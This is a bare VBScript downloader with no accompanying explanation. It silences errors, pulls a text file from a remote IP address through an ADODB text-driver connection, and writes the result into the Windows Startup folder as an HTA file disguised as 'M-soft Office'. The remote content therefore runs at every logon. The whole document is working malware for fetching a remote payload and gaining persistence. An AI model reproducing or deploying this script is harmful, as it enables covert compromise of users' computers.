on error resume next
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://69.50.163.248;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from 328.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from 328.txt", conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\M-soft Office .hta", adPersistXML
rs.close
conn.close
